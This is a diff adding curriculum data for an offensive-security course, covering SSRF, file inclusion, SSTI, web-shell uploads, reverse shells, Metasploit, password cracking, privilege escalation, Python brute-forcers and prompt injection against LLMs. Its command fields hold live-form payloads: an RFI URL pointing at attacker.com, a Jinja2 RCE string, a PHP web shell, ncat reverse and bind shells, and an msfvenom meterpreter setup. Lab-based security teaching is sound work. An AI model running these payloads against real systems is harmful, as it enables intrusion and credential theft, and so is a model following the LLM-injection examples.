+      { title: "HackTricks", url: "https://book.hacktricks.xyz", type: "link" },
+      { title: "OWASP API Security Top 10", url: "https://owasp.org/API-Security/", type: "link" },
+    ],
+    topics: [
+      {
+        id: "m10-1",
+        moduleId: "m10",
+        number: 120,
+        title: "SSRF - Server-Side Request Forgery (basics, blind SSRF, AWS metadata)",
+        type: "theory",
+        week: 10,
+        description:
+          "SSRF tricks the server itself into making requests to internal or unintended resources on the attacker's behalf — conceptually similar to using the server as your personal proxy into its own private network.",
+        keyPoints: [
+          "Against the server itself: point a fetch parameter at 127.0.0.1/localhost to reach internal-only endpoints",
+          "Against other back-end systems: reach non-routable internal IPs with typically weaker security posture",
+          "Cloud/AWS metadata: fetching http://169.254.169.254/latest/meta-data/ can leak instance credentials",
+          "Mitigations: allowlist destination URLs/IPs, block private IP ranges, isolate internal services behind auth",
+        ],
+        terminalCommands: ["http://localhost/admin", "http://169.254.169.254/latest/meta-data/"],
+      },
+      {
+        id: "m10-2",
+        moduleId: "m10",
+        number: 121,
+        title: "File Inclusion - LFI & RFI (path traversal, null byte, wrappers)",
+        type: "theory",
+        week: 10,
+        description:
+          "LFI includes local server files via manipulated input; RFI goes further, pulling in and executing a file hosted on an attacker-controlled external server.",
+        keyPoints: [
+          "LFI vulnerable pattern: include(\"posts/\" . $_GET['post'] . \".php\") — attacker sets post=../../../../etc/passwd",
+          "RFI vulnerable pattern: include($_GET['page']) with a URL — attacker points it at a remote PHP webshell",
+          "RFI requires allow_url_fopen (or similar) to be enabled on the server — increasingly rare in modern configs",
+        ],
+        terminalCommands: [
+          "?file=/etc/passwd",
+          "index.php?page=http://attacker.com/malicious.txt",
+        ],
+      },
+      {
+        id: "m10-3",
+        moduleId: "m10",
+        number: 122,
+        title: "SSTI - Server-Side Template Injection (Jinja2, Twig, Freemarker)",
+        type: "theory",
+        week: 10,
+        description:
+          "SSTI happens when user input is embedded directly into a server-side template rather than passed as data — letting an attacker inject template syntax that the engine evaluates.",
+        keyPoints: [
+          "Vulnerable pattern (Flask/Jinja2): render_template_string(f'Hello {name}!') with name from user input",
+          "Fuzz for the engine first: a payload like ${{<%[%'\"}}%\\ often errors differently per templating engine",
+          "Confirm with math: {{7*7}} rendering as 49 confirms real template evaluation, not just reflection",
+          "RCE payload example (Jinja2/Flask): {{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}",
+        ],
+        terminalCommands: ["{{7*7}}", "<%= 7*7 %>"],
+      },
+      {
+        id: "m10-4",
+        moduleId: "m10",
+        number: 123,
+        title: "File Upload Attacks (extension bypass, MIME type, magic bytes)",
+        type: "theory",
+        week: 10,
+        description:
+          "Unrestricted file upload lets an attacker place executable code (a web shell) directly on the server if validation only checks the filename/MIME type rather than actual content.",
+        keyPoints: [
+          "Web shell payload: <?php echo system($_GET['command']); ?> then access via ?command=id",
+          "Bypass techniques: case obfuscation (exploit.pHp), null-byte injection (exploit.php%00.jpg), alternate extensions (.phtml)",
+          "MIME-type bypass: spoof the multipart Content-Type header to image/jpeg while the file itself is PHP",
+          "Path-traversal bypass: rename the upload to ../shell.php (or URL-encode the slash as %2f) to land outside a restricted, non-executable folder",
+        ],
+      },
+      {
+        id: "m10-5",
+        moduleId: "m10",
+        number: 124,
+        title: "Business Logic Vulnerabilities (price manipulation, workflow bypass)",
+        type: "theory",
+        week: 10,
+        description:
+          "Business logic flaws occur when an app's functionality is misused due to gaps in its design/workflow assumptions, not a coding bug — automated scanners almost never find these; they require manual, creative testing.",
+        keyPoints: [
+          "Price manipulation: intercept an add-to-cart request and modify a price parameter directly",
+          "Workflow bypass: add items to qualify for a free-delivery threshold, then remove them before final payment without re-validation",
+          "Not detectable by pattern-matching — requires understanding what the application is supposed to allow",
+        ],
+      },
+      {
+        id: "m10-6",
+        moduleId: "m10",
+        number: 125,
+        title: "Information Disclosure (stack traces, backup files, source code)",
+        type: "theory",
+        week: 10,
+        description:
+          "Information disclosure is when a system unintentionally exposes sensitive technical or business data to unauthorised parties.",
+        keyPoints: [
+          "Verbose error messages can leak stack traces, DB credentials, or framework versions",
+          "Forgotten backup files (.bak, .old, .zip) often contain old source/config with hardcoded secrets",
+          "Directory listing left enabled exposes an entire folder structure to anyone browsing to it",
+          "Mitigations: custom error handlers, disable directory listing, strip Server/X-Powered-By headers",
+        ],
+      },
+      {
+        id: "m10-7",
+        moduleId: "m10",
+        number: 126,
+        title: "Cryptographic Failures - OWASP A02 (weak ciphers, key reuse)",
+        type: "theory",
+        week: 10,
+        description:
+          "OWASP's A02 category covers failures to properly protect sensitive data — weak password storage, insecure transmission, and poor key management, tying directly back to the M5 cryptography fundamentals.",
+        keyPoints: [
+          "Weak password storage: plaintext or unsalted MD5/SHA1 instead of bcrypt/Argon2",
+          "Insecure transmission: sending sensitive data over plain HTTP or outdated TLS versions",
+          "Poor key management: hardcoded encryption keys directly in source code",
+        ],
+      },
+      {
+        id: "m10-8",
+        moduleId: "m10",
+        number: 127,
+        title: "OWASP API Security Top 10 (BOLA, broken auth, mass assignment)",
+        type: "theory",
+        week: 10,
+        description:
+          "APIs have their own OWASP Top 10 because REST/GraphQL endpoints fail in ways the classic web Top 10 doesn't fully capture — mass assignment and object-level authorization are the two most common.",
+        keyPoints: [
+          "BOLA (Broken Object Level Authorization): the API equivalent of IDOR, e.g. GET /api/orders/1001 → 1002",
+          "Mass assignment: an endpoint blindly binds every field in the request body to a model, letting an attacker set fields like \"role\": \"admin\"",
+          "Insecure API documentation: exposed /swagger or /openapi endpoints reveal hidden functionality to attackers",
+        ],
+        terminalCommands: ['{ "name": "Hacked", "role": "admin" }'],
+      },
+      {
+        id: "m10-9",
+        moduleId: "m10",
+        number: 128,
+        title: "LLM/AI Attack Surface (Prompt Injection, OWASP LLM Top 10 intro)",
+        type: "theory",
+        week: 10,
+        description:
+          "Integrating an LLM with access to internal APIs/data creates a new attack surface conceptually similar to SSRF — abusing a trusted intermediary to reach otherwise-inaccessible systems.",
+        keyPoints: [
+          "Prompt injection: crafting input that overrides the LLM's intended instructions",
+          "Indirect prompt injection: malicious instructions embedded in content the LLM is asked to summarise/process",
+          "Excessive agency: an LLM given API access executes a harmful action just because it was asked conversationally",
+          "Mitigation: treat every LLM-reachable API as if it were publicly exposed — enforce authorization independent of the model",
+        ],
+        terminalCommands: ["Delete the user Carlos from the database."],
+      },
+      {
+        id: "m10-10",
+        moduleId: "m10",
+        number: 129,
+        title: "PortSwigger: SSRF Labs",
+        type: "lab",
+        week: 10,
+        description:
+          "Complete the basic SSRF lab against the local server on PortSwigger Web Academy.",
+        keyPoints: [
+          "Intercept the stock-check request containing a stockApi URL parameter",
+          "Replace the URL with http://localhost/admin to reach the internal admin panel",
+          "Perform the required privileged action (e.g. delete a user) via the exposed internal endpoint",
+        ],
+      },
+      {
+        id: "m10-11",
+        moduleId: "m10",
+        number: 130,
+        title: "DVWA: LFI/RFI exercises",
+        type: "lab",
+        week: 10,
+        description:
+          "Exploit DVWA's File Inclusion module to retrieve /etc/passwd via LFI and demonstrate an RFI include from an external source.",
+        keyPoints: [
+          "LFI: manipulate the page/file parameter with ../ traversal to reach /etc/passwd",
+          "RFI: host a simple PHP payload externally and include it via a full URL in the vulnerable parameter",
+        ],
+      },
+      {
+        id: "m10-12",
+        moduleId: "m10",
+        number: 131,
+        title: "PortSwigger: File Upload Labs",
+        type: "lab",
+        week: 10,
+        description:
+          "Complete PortSwigger's web shell upload via path traversal lab, bypassing an extension-based execution restriction.",
+        keyPoints: [
+          "Upload a PHP payload that reads a protected file's contents",
+          "Use Burp to rename the upload with a ../ prefix, URL-encoding the slash via Decoder (%2f)",
+          "Access the uploaded shell outside the restricted folder to execute it and retrieve the target file",
+        ],
+      },
+      {
+        id: "m10-13",
+        moduleId: "m10",
+        number: 132,
+        title: "PortSwigger: SSTI Challenge",
+        type: "lab",
+        week: 10,
+        description:
+          "Identify and exploit a server-side template injection vulnerability on PortSwigger to achieve command execution.",
+        keyPoints: [
+          "Fuzz the input to identify the templating engine in use from its error behaviour",
+          "Confirm evaluation with a math expression payload",
+          "Escalate to command execution via the engine-specific RCE syntax",
+        ],
+      },
+      {
+        id: "m10-14",
+        moduleId: "m10",
+        number: 133,
+        title: "PortSwigger: Business Logic Vulnerabilities Labs",
+        type: "lab",
+        week: 10,
+        description:
+          "Complete PortSwigger's price-tampering business logic lab by manipulating a cart item's price parameter directly.",
+        keyPoints: [
+          "Attempt a purchase that should fail due to insufficient funds",
+          "Intercept the add-to-cart request and modify the price parameter to an arbitrary lower value",
+          "Complete checkout at the tampered price to solve the lab",
+        ],
+      },
+    ],
+  },
+
+  // ============================================================
+  // M11: Network Exploitation & Credentials
+  // ============================================================
+  {
+    id: "m11",
+    name: "M11: Network Exploitation & Credentials",
+    shortName: "Network Exploitation",
+    month: 3,
+    weeks: [11],
+    description:
+      "Moving beyond web apps into host/network-level exploitation: shells, Metasploit, password cracking, brute-forcing, and privilege escalation on both Linux and Windows — the toolkit for turning a foothold into full compromise.",
+    estimatedHours: 24,
+    outcomes: [
+      "Distinguish reverse vs bind shells and staged vs non-staged payloads",
+      "Generate a payload with msfvenom and catch it with Metasploit's handler",
+      "Crack password hashes with Hashcat and John the Ripper",
+      "Identify common Linux and Windows privilege-escalation vectors",
+      "Understand lateral movement techniques like Pass-the-Hash",
+    ],
+    resources: [
+      { title: "VulnMachines", url: "https://vulnmachines.com", type: "platform" },
+      { title: "HackTheBox Starting Point", url: "https://www.hackthebox.com", type: "platform" },
+      { title: "GTFOBins", url: "https://gtfobins.github.io", type: "link" },
+    ],
+    topics: [
+      {
+        id: "m11-1",
+        moduleId: "m11",
+        number: 134,
+        title: "Reverse Shells vs Bind Shells (how they work, when to use each)",
+        type: "theory",
+        week: 11,
+        description:
+          "Two methods of gaining remote command-line access to a compromised host after exploitation — the key difference is which side initiates the connection.",
+        keyPoints: [
+          "Reverse shell: the target initiates the connection back to the attacker — bypasses inbound firewall/NAT rules, looks like normal outbound traffic",
+          "Bind shell: the target opens a listening port and the attacker connects to it — simpler, but blocked by inbound firewall rules and easier to detect",
+          "Once connected, the attacker can execute commands, transfer files, and pivot to other systems on the network",
+        ],
+        terminalCommands: [
+          "ncat 10.0.0.1 4242 -e /bin/bash",
+          "ncat -nlvp 51337 -e /bin/bash",
+        ],
+      },
+      {
+        id: "m11-2",
+        moduleId: "m11",
+        number: 135,
+        title: "Payload Types: Staged vs Non-Staged (Meterpreter, shell)",
+        type: "theory",
+        week: 11,
+        description:
+          "Staged and non-staged payloads trade off initial payload size, network dependency, and detection risk differently — msfvenom generates both, and Metasploit's handler catches either.",
+        keyPoints: [
+          "Staged: a small stager connects back first, then downloads/executes the larger main payload — lower initial detection footprint",
+          "Non-staged: the full payload is delivered and executed in one shot — faster, no follow-up connection required",
+        ],
+        terminalCommands: [
+          "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o payload.exe",
+          "msfconsole",
+          "use exploit/multi/handler",
+          "set payload windows/meterpreter/reverse_tcp",
+          "set LHOST 192.168.1.5",
+          "set LPORT 4444",
+          "exploit",
+        ],
+      },
+      {
+        id: "m11-3",
+        moduleId: "m11",
+        number: 136,
+        title: "Metasploit Framework Basics (msfconsole, search, use, set, exploit, sessions)",
+        type: "theory",
+        week: 11,
+        description:
+          "Metasploit bundles exploit modules, payloads, and post-exploitation tools behind a single console interface, msfconsole.",
+        keyPoints: [
+          "search finds a module by CVE, name, or platform; use selects it",
+          "set configures module options (RHOSTS, LHOST, payload); exploit (or run) launches the attack",
+          "sessions -l lists active sessions from successful exploitation; sessions -i <id> interacts with one",
+        ],
+        terminalCommands: [
+          "search eternalblue",
+          "use exploit/windows/smb/ms17_010_eternalblue",
+          "set RHOSTS 10.10.10.5",
+          "exploit",
+          "sessions -l",
+        ],
+      },
+      {
+        id: "m11-4",
+        moduleId: "m11",
+        number: 137,
+        title: "Password Hash Cracking with Hashcat (modes, rules, wordlists)",
+        type: "theory",
+        week: 11,
+        description:
+          "Hashcat is a GPU-accelerated password cracker — dramatically faster than CPU-based cracking thanks to the parallel nature of GPUs.",
+        keyPoints: [
+          "-m selects the hash-type mode (e.g. 0 = MD5, 1400 = SHA2-256) — check hashcat's example-hashes wiki for the right mode",
+          "-a selects the attack mode (0 = straight wordlist attack)",
+          "rockyou.txt is the standard go-to wordlist for cracking labs",
+        ],
+        terminalCommands: [
+          "hashcat -a 0 -m 0 hash.txt rockyou.txt",
+          "hashcat -m 1400 hash.txt ~/Downloads/rockyou.txt --username",
+        ],
+      },
+      {
+        id: "m11-5",
+        moduleId: "m11",
+        number: 138,
+        title: "Password Hash Cracking with John the Ripper",
+        type: "theory",
+        week: 11,
+        description:
+          "John the Ripper is the classic CPU-based password cracker — simpler to invoke than Hashcat for quick jobs, with automatic hash-format detection.",
+        keyPoints: [
+          "john with no options auto-detects the hash format and uses its default wordlist",
+          "--format explicitly specifies the hash algorithm when auto-detection is ambiguous",
+          "john --show reveals already-cracked passwords from a previous run without re-cracking",
+        ],
+        terminalCommands: [
+          "john hash.txt --wordlist=rockyou.txt",
+          "john --format=raw-SHA256 hash.txt --wordlist=rockyou.txt",
+          "john --show hash.txt",
+        ],
+      },
+      {
+        id: "m11-6",
+        moduleId: "m11",
+        number: 139,
+        title: "Brute-Force Techniques (Hydra, Medusa - HTTP, SSH, FTP targets)",
+        type: "theory",
+        week: 11,
+        description:
+          "Online brute-forcing tests credentials directly against a live service — much noisier and slower than offline hash cracking, and a prime detection/lockout risk.",
+        keyPoints: [
+          "Common targets: SSH, FTP, SMB, RDP, and HTTP/API login forms",
+          "Dictionary attacks (rockyou.txt) vs credential stuffing (reusing breached credential pairs) vs password spraying (one common password across many usernames, avoiding lockouts)",
+          "Hydra and Medusa are the classic CLI brute-forcing tools; Burp Intruder covers the same technique for web logins",
+        ],
+        terminalCommands: [
+          "hydra -l admin -P rockyou.txt ssh://10.10.10.5",
+          "crackmapexec smb 10.10.1.0/24 -u users.txt -p Welcome@123",
+        ],
+      },
+      {
+        id: "m11-7",
+        moduleId: "m11",
+        number: 140,
+        title: "Privilege Escalation - Linux (SUID, sudo -l, cron jobs, writable paths, GTFOBins)",
+        type: "theory",
+        week: 11,
+        description:
+          "Turning a low-privilege foothold into root — Linux privesc is largely about finding misconfigurations that let you run something as a higher-privileged user.",
+        keyPoints: [
+          "sudo -l shows what the current user can run as root without a password",
+          "SUID binaries owned by root run with root privileges regardless of who executes them — find with find / -perm -4000",
+          "GTFOBins catalogues how common Unix binaries (find, vim, less) can be abused for privesc if run with elevated rights",
+          "Writable cron scripts run by root let you inject your own commands into the next scheduled run",
+        ],
+        terminalCommands: [
+          "sudo -l",
+          "find / -perm -4000 -type f 2>/dev/null",
+          "find / -writable -type f 2>/dev/null | grep -v /proc",
+        ],
+      },
+      {
+        id: "m11-8",
+        moduleId: "m11",
+        number: 141,
+        title: "Privilege Escalation - Windows (AlwaysInstallElevated, unquoted paths, token impersonation)",
+        type: "theory",
+        week: 11,
+        description:
+          "Windows privesc typically abuses misconfigured services, installer policies, or token handling to jump from a standard user to SYSTEM/admin.",
+        keyPoints: [
+          "AlwaysInstallElevated: a registry misconfiguration that lets any user install an MSI package with SYSTEM privileges",
+          "Unquoted service paths: a service path with spaces and no quotes lets an attacker plant an executable earlier in the path that gets run instead",
+          "Token impersonation (e.g. via a service account with SeImpersonatePrivilege) can be abused to escalate to SYSTEM (the 'Potato' family of exploits)",
+        ],
+        terminalCommands: [
+          "wmic service get name,pathname,startmode",
+          "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
+        ],
+      },
+      {
+        id: "m11-9",
+        moduleId: "m11",
+        number: 142,
+        title: "Lateral Movement & Pivoting Basics (Pass-the-Hash, SMB, RDP)",
+        type: "theory",
+        week: 11,
+        description:
+          "Once one host is compromised, lateral movement is how an attacker reaches other hosts in the same network without needing to crack any more passwords.",
+        keyPoints: [
+          "Pass-the-Hash: authenticate to another Windows host using a stolen NTLM hash directly, without ever cracking it to plaintext",
+          "SMB and RDP are the two most common lateral-movement protocols in Windows/AD environments",
+          "Pivoting: routing traffic through a compromised host to reach network segments not directly reachable from the attacker's machine",
+        ],
+      },
+      {
+        id: "m11-10",
+        moduleId: "m11",
+        number: 143,
+        title: "VulnMachines: 5 Beginner Machines (write up each)",
+        type: "lab",
+        week: 11,
+        description:
+          "Compromise 5 beginner-difficulty VulnMachines boxes end to end, writing up the full methodology for each.",
+        keyPoints: [
+          "For each machine: recon (Nmap) → identify a vulnerable service/version → exploit → privesc → capture the flag",
+          "Write-up format: target overview, recon findings, exploitation steps, privesc path, flag, lessons learned",
+        ],
+      },
+      {
+        id: "m11-11",
+        moduleId: "m11",
+        number: 144,
+        title: "Lab: Crack a provided hash list with Hashcat using rockyou.txt",
+        type: "lab",
+        week: 11,
+        description:
+          "Crack a provided list of MD5 and SHA-256 hashes using Hashcat against the rockyou.txt wordlist.",
+        keyPoints: [
+          "Identify each hash's type/length before selecting the correct -m mode",
+          "Run Hashcat against the full hash list in one batch and record the cracked results",
+          "Document which passwords cracked instantly vs which required additional rule sets",
+        ],
+        terminalCommands: ["hashcat -m 0 md5_hashes.txt rockyou.txt", "hashcat -m 1400 sha256_hashes.txt rockyou.txt"],
+      },
+    ],
+  },
+
+  // ============================================================
+  // M12: Python Scripting for Security
+  // ============================================================
+  {
+    id: "m12",
+    name: "M12: Python Scripting for Security",
+    shortName: "Python Scripting",
+    month: 3,
+    weeks: [11],
+    description:
+      "Automation is what separates a hobbyist from a professional — this module builds practical Python scripting skills through four real security tools you'll write from scratch: a MAC changer, port scanner, subdomain brute-forcer, and login brute-forcer.",
+    estimatedHours: 8,
+    outcomes: [
+      "Write and run Python scripts confidently (variables, control flow, functions)",
+      "Use the socket and requests libraries for network programming",
+      "Build a MAC address changer, port scanner, and subdomain brute-forcer",
+      "Build a basic login brute-forcer against a web form",
+    ],
+    resources: [
+      { title: "Python docs", url: "https://docs.python.org/3/", type: "link" },
+      { title: "requests library docs", url: "https://requests.readthedocs.io", type: "link" },
+    ],
+    topics: [
+      {
+        id: "m12-1",
+        moduleId: "m12",
+        number: 145,
+        title: "Python Fundamentals (variables, control flow, functions, modules, libraries)",
+        type: "theory",
+        week: 11,
+        description:
+          "The Python syntax and standard-library building blocks every script in this module relies on.",
+        keyPoints: [
+          "Core types: int, float, str, bool — dynamically typed, no declarations needed",
+          "Control flow: for/while loops, if/elif/else conditionals, try/except for error handling",
+          "Functions with def, reusable across scripts; import brings in modules/libraries",
+          "Security-relevant libraries: socket (networking), requests (HTTP), hashlib (hashing), scapy (packet crafting)",
+        ],
+        terminalCommands: [
+          "def greet(name):\n    return f\"Hello, {name}!\"",
+          "try:\n    x = 1 / 0\nexcept ZeroDivisionError as e:\n    print(f\"Error: {e}\")",
+        ],
+      },
+      {
+        id: "m12-2",
+        moduleId: "m12",
+        number: 146,
+        title: "Working with Sockets & Requests in Python",
+        type: "theory",
+        week: 11,
+        description:
+          "socket gives you raw TCP/UDP connections (the basis of a port scanner); requests gives you a friendly HTTP client (the basis of a login brute-forcer or subdomain enumerator).",
+        keyPoints: [
+          "socket.socket(AF_INET, SOCK_STREAM) opens a TCP socket; .connect_ex() attempts a connection without raising on failure",
+          "requests.get()/requests.post() send HTTP requests and expose .status_code and .content on the response",
+          "Always set a timeout on both sockets and requests — an unresponsive host will otherwise hang your script indefinitely",
+        ],
+        terminalCommands: [
+          "import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.settimeout(1)\nresult = s.connect_ex((ip, port))",
+        ],
+      },
+      {
+        id: "m12-3",
+        moduleId: "m12",
+        number: 147,
+        title: "Python: MAC Address Changer Script",
+        type: "lab",
+        week: 11,
+        description:
+          "Build a command-line tool that changes a Linux network interface's MAC address — a classic first scripting project combining argparse, regex validation, and subprocess.",
+        keyPoints: [
+          "argparse defines -i/--interface and -m/--mac CLI flags",
+          "Validate the new MAC against a regex before ever touching the interface",
+          "Bring the interface down → change the address → bring it back up, all via subprocess calling ip link",
+          "Verify the change by re-reading the interface and regex-matching the new MAC out of the output",
+        ],
+        terminalCommands: [
+          "sudo python3 mac_changer.py -i eth0 -m 00:11:22:33:44:55",
+          "sudo ip link set dev eth0 down",
+          "sudo ip link set dev eth0 address 00:11:22:33:44:55",
+          "sudo ip link set dev eth0 up",
+        ],
+      },
+      {
+        id: "m12-4",
+        moduleId: "m12",
+        number: 148,
+        title: "Python: Port Scanner Script (TCP connect scan)",
+        type: "lab",
+        week: 11,
+        description:
+          "Build a simple TCP connect-scan port scanner that accepts a target IP and port range as arguments — the same underlying technique Nmap's -sT scan uses.",
+        keyPoints: [
+          "Loop over the port range, opening a new socket per port with a short timeout",
+          "connect_ex() returns 0 on success (port open) — anything else means closed/filtered",
+          "Print open ports as they're found so long scans give live feedback",
+        ],
+        terminalCommands: [
+          "import socket, sys\ntarget = sys.argv[1]\nfor port in range(1, 1025):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.settimeout(0.5)\n    if s.connect_ex((target, port)) == 0:\n        print(f\"[+] Port {port} is open\")\n    s.close()",
+        ],
+      },
+      {
+        id: "m12-5",
+        moduleId: "m12",
+        number: 149,
+        title: "Python: Subdomain Brute-Forcer Script",
+        type: "lab",
+        week: 11,
+        description:
+          "Build a subdomain enumerator that checks a wordlist of common subdomain prefixes against a target domain using the requests library.",
+        keyPoints: [
+          "Loop a subdomain wordlist, building http://{sub}.{domain} for each entry",
+          "A 200 status code (with a short timeout) indicates a live, resolvable subdomain",
+          "Wrap the request in try/except requests.ConnectionError to skip non-existent subdomains cleanly",
+        ],
+        terminalCommands: [
+          "import requests\nsubdomains = [\"www\", \"mail\", \"ftp\", \"admin\", \"test\", \"dev\"]\ndomain = input(\"Enter the domain: \")\nfor sub in subdomains:\n    url = f\"http://{sub}.{domain}\"\n    try:\n        r = requests.get(url, timeout=3)\n        if r.status_code == 200:\n            print(f\"[+] Found: {url}\")\n    except requests.ConnectionError:\n        pass",
+        ],
+      },
+      {
+        id: "m12-6",
+        moduleId: "m12",
+        number: 150,
+        title: "Python: Application Login Brute-Forcer Script",
+        type: "lab",
+        week: 11,
+        description:
+          "Build a login-form brute-forcer using requests.post(), detecting success by looking for a string only present on a successful login.",
+        keyPoints: [
+          "POST a username/password pair to the login endpoint's data={} parameter for each wordlist entry",
+          "Check for a 'needle' string in the response (e.g. 'Welcome back') to confirm a valid credential pair",
+          "Only ever run against your own lab targets (e.g. DVWA) — this is a noisy, easily detected technique",
+        ],
+        terminalCommands: [
+          "import requests\ntarget = \"http://127.0.0.1:8080\"\nneedle = \"Welcome back\"\nfor password in open(\"passwords.txt\"):\n    password = password.strip()\n    r = requests.post(target, data={\"username\": \"admin\", \"password\": password})\n    if needle in r.text:\n        print(f\"[+] Valid password: {password}\")\n        break",
+        ],
+      },
+      {
+        id: "m12-7",
+        moduleId: "m12",
+        number: 151,
+        title: "Using AI (ChatGPT/DeepSeek) to Generate & Review Security Scripts",
+        type: "theory",
+        week: 11,
+        description:
+          "AI assistants can meaningfully speed up writing and reviewing security tooling — but every line of AI-generated code still needs to be understood and validated before you run it against anything.",
+        keyPoints: [
+          "Good uses: scaffolding a script's structure, explaining unfamiliar code, spotting insecure patterns (hardcoded secrets, missing input validation)",
+          "Always test AI-generated scripts in an isolated lab environment before relying on them operationally",
+          "Never paste real credentials, internal hostnames, or client data into a public AI tool as part of a prompt",
+        ],
+      },
+    ],
+  },
+
+  // ============================================================
+  // M13: Hacking with AI
+  // ============================================================
+  {
+    id: "m13",
+    name: "M13: Hacking with AI",
+    shortName: "Hacking with AI",
+    month: 3,
+    weeks: [11],
+    description:
+      "AI is reshaping both sides of the security fight — this module covers how AI/ML is used offensively (recon automation, AI-generated phishing) and defensively (anomaly detection), the ethical boundaries involved, and hands-on use of a local AI model for security work.",
+    estimatedHours: 10,
+    outcomes: [
+      "Explain the relationship between AI, ML, and Deep Learning in a security context",
+      "Describe offensive and defensive uses of AI in cybersecurity",
+      "Install and run a local AI model (DeepSeek via Ollama)",
+      "Recognise prompt injection as an attack technique against AI systems",
+      "Use AI to assist recon scripting and spot insecure code patterns",
+    ],
+    resources: [
+      { title: "Ollama", url: "https://ollama.com", type: "tool" },
+      { title: "OWASP LLM Top 10", url: "https://owasp.org/www-project-top-10-for-large-language-model-applications/", type: "link" },
+    ],
+    topics: [
+      {
+        id: "m13-1",
+        moduleId: "m13",
+        number: 152,
+        title: "Basics of AI, ML, and Deep Learning in Security Context",
+        type: "theory",
+        week: 11,
+        description:
+          "AI, ML, and Deep Learning are nested layers, not synonyms — AI is the broad goal (simulating decisions), ML is a subset that learns patterns from labelled data, and DL is a further subset using layered neural networks.",
+        keyPoints: [
+          "AI: machines simulating human decision-making (e.g. a spam filter)",
+          "ML: trained on labelled data to find patterns (e.g. learning from past attacks to flag future ones)",
+          "DL: layered neural networks needing large datasets, auto-discovers features (e.g. detecting malware behaviourally, without line-by-line code review)",
+          "Security applications scale with the layer: AI → smart firewalls, ML → phishing/brute-force detection, DL → log analysis and zero-day pattern detection",
+        ],
+      },
+      {
+        id: "m13-2",
+        moduleId: "m13",
+        number: 153,
+        title: "Role of AI in Offensive & Defensive Cybersecurity",
+        type: "theory",
+        week: 11,
+        description:
+          "AI is genuinely dual-use in security — the same underlying techniques that detect anomalies for defenders can generate convincing phishing content for attackers.",
+        keyPoints: [
+          "Offensive uses: AI-generated phishing/deepfakes, OSINT-driven recon, AI password recovery (e.g. PassGAN), AI-evasive malware",
+          "Defensive uses: anomaly detection (e.g. login from a new country), AI-powered spam/phishing filters, automated incident response (auto-isolating infected devices), AI code-vulnerability scanning (e.g. GitHub Copilot)",
+        ],
+      },
+      {
+        id: "m13-3",
+        moduleId: "m13",
+        number: 154,
+        title: "Ethical Boundaries in AI-Assisted Hacking",
+        type: "theory",
+        week: 11,
+        description:
+          "AI's dual-use nature raises the same authorisation questions as any other tool in this course — just because AI can generate an attack script doesn't make it legal or ethical to run one.",
+        keyPoints: [
+          "Key concerns: privacy violations (PII collection), lack of accountability, bias/discrimination, weaponisation of AI capability",
+          "Ethical-use principles: follow applicable laws/regulations, obtain consent, be transparent, prevent misuse",
+        ],
+      },
+      {
+        id: "m13-4",
+        moduleId: "m13",
+        number: 155,
+        title: "Installing & Using Local AI (DeepSeek locally)",
+        type: "setup",
+        week: 11,
+        description:
+          "Run DeepSeek R1 fully offline via Ollama — a local, open-source coding/reasoning model comparable to ChatGPT/Copilot but with no data leaving your machine.",
+        keyPoints: [
+          "System requirements: 16GB RAM minimum (32GB recommended), 20-50GB storage, GPU optional but accelerates inference",
+          "Ollama manages model download, resource optimisation, and integration for you",
+          "The VS Code 'Continue' extension auto-detects a locally running Ollama model for in-editor use",
+        ],
+        terminalCommands: [
+          "ollama run deepseek-coder:6.7b",
+          "ollama pull deepseek-coder:6.7b",
+        ],
+      },
+      {
+        id: "m13-5",
+        moduleId: "m13",
+        number: 156,
+        title: "AI-Powered Reconnaissance & OSINT Automation",
+        type: "theory",
+        week: 11,
+        description:
+          "AI can accelerate recon by generating and adapting scripts on the fly — for subdomain scanning, WHOIS/DNS lookups, and scraping public sources.",
+        keyPoints: [
+          "Use case: ask a local/AI model to generate a starter script for a specific recon task, then review and adapt it",
+          "AI can also scan social media/public sites for personal info relevant to a spear-phishing risk assessment",
+          "Always validate AI-suggested recon scripts against the authorised scope before running them",
+        ],
+      },
+      {
+        id: "m13-6",
+        moduleId: "m13",
+        number: 157,
+        title: "AI for Phishing & Social Engineering (awareness exercise)",
+        type: "theory",
+        week: 11,
+        description:
+          "AI makes phishing more convincing by fixing the spelling/grammar tells that used to be reliable red flags — this topic is an awareness exercise, not an invitation to phish real people.",
+        keyPoints: [
+          "Phishing taxonomy: Vishing (phone), Smishing (SMS), Whaling (targets executives), Clone phishing, Spear phishing (personalised)",
+          "AI-generated phishing emails read as more polished and personalised than older templated scams",
+          "User protections: enable 2FA everywhere, never click links in unsolicited 'urgent' emails, verify via a separate channel",
+        ],
+      },
+      {
+        id: "m13-7",
+        moduleId: "m13",
+        number: 158,
+        title: "Bypassing AI Ethical Limits via Prompt Injection",
+        type: "theory",
+        week: 11,
+        description:
+          "Prompt injection is the technique of crafting input that overrides an AI system's intended constraints or instructions.",
+        keyPoints: [
+          "Direct prompt injection: the attacker's prompt itself overrides the model's normal behaviour/guardrails",
+          "Indirect prompt injection: malicious instructions are embedded in content the LLM is asked to analyse (a webpage, a document)",
+          "Jailbreaking: exploiting model vulnerabilities specifically to bypass safety guardrails",
+          "Defences: strict input validation/filtering, isolating user input from system instructions, ongoing monitoring",
+        ],
+      },
+      {
+        id: "m13-8",
+        moduleId: "m13",
+        number: 159,
+        title: "Identifying Code Vulnerabilities Using AI (ChatGPT, GitHub Copilot)",
+        type: "theory",
+        week: 11,
+        description:
+          "AI code-review tools can flag common vulnerability patterns faster and more consistently than manual review alone — a useful second pair of eyes, not a replacement for understanding the code.",
+        keyPoints: [
+          "Common vulnerabilities AI tools flag well: SQL Injection, XSS, buffer overflows, hardcoded passwords",
+          "Tools: GitHub Copilot (inline suggestions/warnings), CodeQL (static analysis), Semgrep (customisable scanning), ChatGPT/LLMs (explain and review code)",
+          "Example: AI flags an unfiltered login form input and suggests proper input validation",
+        ],
+      },
+      {
+        id: "m13-9",
+        moduleId: "m13",
+        number: 160,
+        title: "Lab: AI-assisted subdomain enumeration script",
+        type: "lab",
+        week: 11,
+        description:
+          "Use a local/AI model to help generate and refine a subdomain enumeration script, then run it against a lab target — building directly on the M12 subdomain brute-forcer.",
+        keyPoints: [
+          "Ask the AI model to extend the M12 subdomain script with concurrency/threading",
+          "Review every suggested change line by line before running it",
